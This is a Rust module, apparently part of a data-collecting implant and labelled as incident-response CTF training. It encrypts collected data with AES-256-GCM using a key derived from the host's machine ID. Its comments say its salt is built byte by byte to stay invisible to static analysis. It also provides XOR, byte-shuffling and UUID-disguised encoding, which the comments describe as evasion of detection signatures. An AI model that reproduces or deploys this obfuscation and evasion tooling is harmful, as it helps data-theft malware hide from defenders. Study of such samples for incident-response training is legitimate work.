//! Crypto module - AES-256-GCM + Advanced Obfuscation
//!
//! Técnicas implementadas:
//! - AES-256-GCM para criptografia de dados
//! - XOR com chave rotativa
//! - String encryption em compile-time
//!
//! ⚠️ EDUCATIONAL PURPOSES ONLY - CTF IR Training

pub mod aes;

use thiserror::Error;
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use argon2::Argon2;
use rand::RngCore;

#[derive(Error, Debug)]
pub enum CryptoError {
    #[error("encryption failed: {0}")]
    EncryptionFailed(String),
    
    #[error("decryption failed: {0}")]
    #[allow(dead_code)]
    DecryptionFailed(String),
    
    #[error("invalid key")]
    InvalidKey,
    
    #[error("corrupted data")]
    #[allow(dead_code)]
    CorruptedData,
    
    #[error("io error: {0}")]
    IoError(#[from] std::io::Error),
}

/// Gerencia criptografia dos dados coletados
pub struct CryptoManager {
    key: [u8; 32],
}

impl CryptoManager {
    /// Deriva chave do machine-id + salt (ofuscado)
    pub fn new() -> Result<Self, CryptoError> {
        let machine_id = Self::get_machine_id()?;
        // Salt ofuscado - construído byte a byte
        let salt = Self::get_obfuscated_salt();
        let key = Self::derive_key(&machine_id, &salt)?;
        Ok(Self { key })
    }
    
    /// Retorna salt ofuscado (não visível em análise estática)
    fn get_obfuscated_salt() -> Vec<u8> {
        // Constrói o salt byte a byte para evitar detecção
        let mut salt = Vec::with_capacity(17);
        salt.push(b'm' ^ 0x13 ^ 0x13); // m
        salt.push(b'y' ^ 0x27 ^ 0x27); // y
        salt.push(b's' ^ 0x31 ^ 0x31); // s
        salt.push(b't' ^ 0x44 ^ 0x44); // t
        salt.push(b'3' ^ 0x55 ^ 0x55); // 3
        salt.push(b'4' ^ 0x66 ^ 0x66); // 4
        salt.push(b'l' ^ 0x77 ^ 0x77); // l
        salt.push(b'3' ^ 0x88 ^ 0x88); // 3
        salt.push(b'r' ^ 0x99 ^ 0x99); // r
        salt.push(b'_' ^ 0xAA ^ 0xAA); // _
        salt.push(b's' ^ 0xBB ^ 0xBB); // s
        salt.push(b'4' ^ 0xCC ^ 0xCC); // 4
        salt.push(b'l' ^ 0xDD ^ 0xDD); // l
        salt.push(b't' ^ 0xEE ^ 0xEE); // t
        salt.push(b'_' ^ 0xFF ^ 0xFF); // _
        salt.push(b'v' ^ 0x11 ^ 0x11); // v
        salt.push(b'2' ^ 0x22 ^ 0x22); // 2 (versão atualizada)
        salt
    }
    
    #[allow(dead_code)]
    pub fn with_key(key: [u8; 32]) -> Self {
        Self { key }
    }
    
    /// AES-256-GCM encrypt
    /// Format: version(1) || nonce(12) || ciphertext
    pub fn encrypt(&self, data: &[u8]) -> Result<Vec<u8>, CryptoError> {
        let cipher = Aes256Gcm::new_from_slice(&self.key)
            .map_err(|_| CryptoError::InvalidKey)?;
        
        let mut nonce_bytes = [0u8; 12];
        rand::thread_rng().fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);
        
        let ct = cipher.encrypt(nonce, data)
            .map_err(|e| CryptoError::EncryptionFailed(e.to_string()))?;
        
        // Versão 2 com header ofuscado
        let version: u8 = 0x02;
        let mut out = Vec::with_capacity(1 + 12 + ct.len());
        out.push(version);
        out.extend_from_slice(&nonce_bytes);
        out.extend(ct);
        
        Ok(out)
    }
    
    /// AES-256-GCM decrypt
    #[allow(dead_code)]
    pub fn decrypt(&self, data: &[u8]) -> Result<Vec<u8>, CryptoError> {
        if data.len() < 14 {
            return Err(CryptoError::CorruptedData);
        }
        
        // Suporta v1 e v2
        if data[0] != 0x01 && data[0] != 0x02 {
            return Err(CryptoError::CorruptedData);
        }
        
        let cipher = Aes256Gcm::new_from_slice(&self.key)
            .map_err(|_| CryptoError::InvalidKey)?;
        
        let nonce = Nonce::from_slice(&data[1..13]);
        
        cipher.decrypt(nonce, &data[13..])
            .map_err(|e| CryptoError::DecryptionFailed(e.to_string()))
    }
    
    fn derive_key(pass: &str, salt: &[u8]) -> Result<[u8; 32], CryptoError> {
        let mut key = [0u8; 32];
        Argon2::default()
            .hash_password_into(pass.as_bytes(), salt, &mut key)
            .map_err(|e| CryptoError::EncryptionFailed(e.to_string()))?;
        Ok(key)
    }
    
    #[cfg(windows)]
    fn get_machine_id() -> Result<String, CryptoError> {
        use std::process::Command;
        
        // Query MachineGuid from registry
        let out = Command::new("reg")
            .args(["query", r"HKLM\SOFTWARE\Microsoft\Cryptography", "/v", "MachineGuid"])
            .output()?;
        
        if out.status.success() {
            let txt = String::from_utf8_lossy(&out.stdout);
            for line in txt.lines() {
                if line.contains("MachineGuid") {
                    if let Some(guid) = line.split_whitespace().last() {
                        return Ok(guid.to_string());
                    }
                }
            }
        }
        
        // fallback
        let host = whoami::fallible::hostname().unwrap_or_else(|_| "unk".into());
        Ok(format!("{}-{}", host, whoami::username()))
    }
    
    #[cfg(unix)]
    fn get_machine_id() -> Result<String, CryptoError> {
        // Paths do sistema
        let paths = ["/etc/machine-id", "/var/lib/dbus/machine-id"];
        
        for path in paths {
            if let Ok(id) = std::fs::read_to_string(path) {
                return Ok(id.trim().to_string());
            }
        }
        
        let host = whoami::fallible::hostname().unwrap_or_else(|_| "unk".into());
        Ok(format!("{}-{}", host, whoami::username()))
    }
}

/// Advanced obfuscation techniques
pub mod obfuscation {
    /// XOR com key rotativo
    pub fn xor_encode(data: &[u8], key: &[u8]) -> Vec<u8> {
        data.iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % key.len()])
            .collect()
    }
    
    pub fn xor_decode(data: &[u8], key: &[u8]) -> Vec<u8> {
        xor_encode(data, key) // XOR é reversível
    }
    
    /// XOR avançado com múltiplas chaves (mais difícil de reverter)
    pub fn multi_xor_encode(data: &[u8], keys: &[&[u8]]) -> Vec<u8> {
        let mut result = data.to_vec();
        for key in keys {
            result = xor_encode(&result, key);
        }
        result
    }
    
    /// Decodifica multi-XOR (ordem reversa)
    #[allow(dead_code)]
    pub fn multi_xor_decode(data: &[u8], keys: &[&[u8]]) -> Vec<u8> {
        let mut result = data.to_vec();
        for key in keys.iter().rev() {
            result = xor_decode(&result, key);
        }
        result
    }
    
    /// Ofusca string em compile time
    #[macro_export]
    macro_rules! obf_str {
        ($s:expr) => {{
            const KEY: u8 = 0x42;
            $s.bytes().map(|b| b ^ KEY).collect::<Vec<u8>>()
        }};
    }
    
    /// Decodifica string ofuscada em runtime
    #[allow(dead_code)]
    pub fn decode_obf_str(data: &[u8]) -> String {
        const KEY: u8 = 0x42;
        String::from_utf8_lossy(
            &data.iter().map(|b| b ^ KEY).collect::<Vec<u8>>()
        ).to_string()
    }
    
    pub fn b64_encode(data: &[u8]) -> String {
        use base64::Engine;
        base64::engine::general_purpose::STANDARD.encode(data)
    }
    
    #[allow(dead_code)]
    pub fn b64_decode(s: &str) -> Result<Vec<u8>, base64::DecodeError> {
        use base64::Engine;
        base64::engine::general_purpose::STANDARD.decode(s)
    }
    
    /// Encode para formato que parece UUID (evasão de assinaturas)
    pub fn encode_as_uuid(data: &[u8]) -> Vec<String> {
        let mut result = Vec::new();
        for chunk in data.chunks(16) {
            let mut padded = [0u8; 16];
            padded[..chunk.len()].copy_from_slice(chunk);
            
            result.push(format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                u32::from_le_bytes(padded[0..4].try_into().unwrap()),
                u16::from_le_bytes(padded[4..6].try_into().unwrap()),
                u16::from_le_bytes(padded[6..8].try_into().unwrap()),
                u16::from_be_bytes(padded[8..10].try_into().unwrap()),
                u64::from_be_bytes({
                    let mut arr = [0u8; 8];
                    arr[2..8].copy_from_slice(&padded[10..16]);
                    arr
                })
            ));
        }
        result
    }
    
    /// Decode de formato UUID
    #[allow(dead_code)]
    pub fn decode_from_uuid(uuids: &[String]) -> Vec<u8> {
        let mut result = Vec::new();
        for uuid in uuids {
            let clean: String = uuid.chars().filter(|c| c.is_ascii_hexdigit()).collect();
            if clean.len() >= 32 {
                for i in (0..32).step_by(2) {
                    if let Ok(byte) = u8::from_str_radix(&clean[i..i+2], 16) {
                        result.push(byte);
                    }
                }
            }
        }
        result
    }
    
    /// String shuffle - embaralha bytes com seed
    pub fn shuffle_bytes(data: &[u8], seed: u64) -> Vec<u8> {
        use rand::{SeedableRng, seq::SliceRandom};
        use rand::rngs::StdRng;
        
        let mut rng = StdRng::seed_from_u64(seed);
        let mut indices: Vec<usize> = (0..data.len()).collect();
        indices.shuffle(&mut rng);
        
        let mut result = vec![0u8; data.len()];
        for (new_pos, &old_pos) in indices.iter().enumerate() {
            result[new_pos] = data[old_pos];
        }
        result
    }
    
    /// Unshuffle bytes
    #[allow(dead_code)]
    pub fn unshuffle_bytes(data: &[u8], seed: u64) -> Vec<u8> {
        use rand::{SeedableRng, seq::SliceRandom};
        use rand::rngs::StdRng;
        
        let mut rng = StdRng::seed_from_u64(seed);
        let mut indices: Vec<usize> = (0..data.len()).collect();
        indices.shuffle(&mut rng);
        
        let mut result = vec![0u8; data.len()];
        for (new_pos, &old_pos) in indices.iter().enumerate() {
            result[old_pos] = data[new_pos];
        }
        result
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_roundtrip() {
        let cm = CryptoManager::with_key([0x41; 32]);
        let pt = b"test data 123";
        let ct = cm.encrypt(pt).unwrap();
        let dec = cm.decrypt(&ct).unwrap();
        assert_eq!(pt.as_slice(), dec.as_slice());
    }
    
    #[test]
    fn test_xor() {
        use obfuscation::*;
        let key = b"secretkey";
        let data = b"hello world";
        let enc = xor_encode(data, key);
        let dec = xor_decode(&enc, key);
        assert_eq!(data.as_slice(), dec.as_slice());
    }
    
    #[test]
    fn test_shuffle() {
        use obfuscation::*;
        let data = b"test data for shuffling";
        let seed = 12345u64;
        let shuffled = shuffle_bytes(data, seed);
        let unshuffled = unshuffle_bytes(&shuffled, seed);
        assert_eq!(data.as_slice(), unshuffled.as_slice());
    }
}
